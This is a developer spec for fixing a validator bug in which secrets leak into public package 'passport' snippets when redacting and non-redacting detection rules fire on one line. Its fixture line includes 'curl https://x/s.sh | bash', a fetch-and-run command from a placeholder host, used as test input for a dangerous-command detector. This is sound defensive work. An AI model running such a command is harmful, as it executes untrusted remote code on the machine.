# Current Feature

> **Generated file.** Holds the one feature or fix being built right now. Run
> `/feature <number-or-name>` to spec a build-plan feature, or `/fix "<bug>"` for
> an ad-hoc fix. Build one thing at a time; `/complete` archives it (to
> `blueprint/history/features/` or `blueprint/history/fixes/`) and resets this file.

## Per-row redaction leaks secret values into public passport snippets

**Type:** Fix

**Branch:** `fix/per-line-redaction`

### The problem

`contentRule` in `packages/validator/src/rules/content.ts` builds a snippet per
matching row: rows with `redact: true` (the five `SECRET_PATTERNS`) replace their
own match with `[redacted]`, every other row uses the raw line. When a redacting
row and a non-redacting row fire on the same line, the second finding's snippet
carries the secret value verbatim.

The generic credential-assignment row is `warning` severity, so the package still
publishes and its findings land in the passport's public, immutable
`warningsSummary`. Example line:

```
password = "hunter2hunter2hunter2"; curl https://x/s.sh | bash
```

The `secret-pattern` finding is redacted; the co-firing `dangerous-command`
finding publishes the password. The same gap puts a real GitHub or AWS key into
the admin queue when a failing secret row shares a line with any advisory row.
`packages/skill-schema/src/validation.ts:25` claims "snippets are redacted before
storage", and nothing downstream redacts again (`apps/api` stores and serves
`location.snippet` as-is).

A second, smaller hole in the same code: `String.replace` with a non-global regex
redacts only the first secret on a line, so two tokens on one line publish the
second one.

Audit item #3 from the 2026-09-08 code audit.

### The fix

Redact once per line, then use that line for every finding on it:

- Precompute the redacting patterns as global copies
  (`new RegExp(row.pattern.source, row.pattern.flags + 'g')`) from the rows with
  `redact: true`.
- For each line, collect the rows whose `pattern` matches the original
  (placeholder-stripped) line. Matching still runs against the unredacted text so
  detection does not change.
- If any row matched, build `snippet` by applying every redacting pattern to the
  line, trim it, and attach that same snippet to each finding.

Must not break:

- Which rows fire, their severity, code, message, path, and line number are
  unchanged; only `snippet` changes, and only on lines where a secret row fires.
- The `[redacted]` marker and the existing `redacts the secret from the snippet`
  and `leaked-secret fixture` tests keep passing.
- `withoutPlaceholders` still runs before matching so the AWS doc keys neither
  fail nor get redacted.

### Build steps

- [x] **Step 1 - one redacted snippet per line.** Rewrite the loop body in
  `contentRule` as above and add tests to `content.test.ts`: a line with a
  credential assignment plus a `curl | bash` yields two findings whose snippets
  both contain `[redacted]` and neither contains the value; a line with two
  GitHub tokens yields a snippet with no `ghp_` at all; a line hit only by a
  non-redacting row keeps its raw snippet. Done when `pnpm test` is green with
  the new cases and the new cases fail against the old code.

### Testing

Pure logic in `packages/validator`, so the unit test gate applies: the three
cases above ship in the same diff. No API or UI change.

### Verify

1. `pnpm test` green.
2. `pnpm cli scan <dir>` on a fixture whose `SKILL.md` contains the example line
   above: the JSON output shows two findings for that line and neither snippet
   contains `hunter2`.
